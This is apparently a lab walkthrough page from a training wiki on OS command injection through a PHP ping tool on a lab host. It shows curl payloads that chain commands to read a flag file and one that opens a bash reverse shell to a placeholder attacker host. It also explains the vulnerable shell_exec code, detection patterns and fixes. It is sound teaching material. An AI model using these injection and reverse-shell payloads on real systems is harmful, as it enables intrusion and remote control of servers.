# C09 · Station C — OS command injection · ★★☆☆

> **Chapter:** [[Chapter-09-Overview]] · **Next:** [[C09-Station-D-LFI-RCE]]
> **Host:** `hollow-portal-01` (`target-web`) · **Target:** `/tools.php` (the ping box)
> **The bug:** the network-tools feature builds `ping -c 1 <host>` by string concatenation and runs it through a shell. A `;` in `host` runs your command.

No upload, no file — just an input that reaches a shell.

---

## 1. Exploit — do this first

```bash
attacker$ curl -G http://target-web/tools.php \
  --data-urlencode 'host=127.0.0.1; id; cat /var/www/flag.txt'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
R2R{w3b_rce_is_your_front_d00r}
```

Reverse shell (listener on the attacker):

```bash
attacker$ curl -G http://target-web/tools.php \
  --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

| Token | What it does |
|---|---|
| `host=127.0.0.1` | a valid host so `ping` starts cleanly |
| `;` | ends the `ping` command; what follows is a **new** command |
| `id; cat …` | runs as `www-data` |
| `` $(…) ``, `|`, `&&` | all work too — the whole string hits `/bin/sh -c` |

---

## 2. How you find it

```bash
attacker$ curl -G http://target-web/tools.php --data-urlencode 'host=127.0.0.1' | grep Running
  <p class="muted">Running: <code>ping -c 1 -W 1 127.0.0.1</code></p>
```

The page **shows you the command it will run** with your value tacked on the end — a textbook sign that your input is concatenated into a shell line. Append a `;` and a second command.

---

## 3. Why it works

```php
$cmd = "ping -c 1 -W 1 " . $host;   // raw concatenation
shell_exec($cmd . ' 2>&1');
```

`shell_exec()` passes the whole string to `/bin/sh -c`, which **re-parses** shell metacharacters. So `127.0.0.1; cat …` is two commands, not one argument to `ping`. The code never escaped or validated `host`.

---

## 4. Pitfalls

- **Encode your payload** — `curl -G --data-urlencode` handles `;`, spaces, and `&`. A raw `&` in a URL starts a new parameter.
- **`/dev/tcp` needs bash** — the sink is `sh`, so wrap reverse shells in `bash -c "…"`.
- **`-W 1`** means the `ping` times out fast; your appended command runs right after.

---

## 5. Detect & fix

- **Detect:** request parameters containing `;`, `|`, `` ` ``, `$(`; a `ping`/`sh -c` process with a child like `bash` or an outbound socket. Recipes in [[Blue-Team-Playbook]].
- **Fix:** don't shell out — use a library, or pass arguments as an **array** (`proc_open(['ping','-c','1',$host], …)`) so there is no shell to re-parse; validate `host` to a strict hostname/IP pattern. More in [[Blue-Team-Playbook]].

---

## 6. What you learned

- Building a command line by concatenation hands the shell your metacharacters. Pass argv arrays, never strings.
- "Diagnostic" features (ping/traceroute/nslookup) are the classic command-injection sink.
- Next, an input that reaches `include()` instead of a shell: [[C09-Station-D-LFI-RCE]].

> Next: [[C09-Station-D-LFI-RCE]] · Related: [[C01-Station-D-Command-Injection]] · [[Blue-Team-Playbook]]
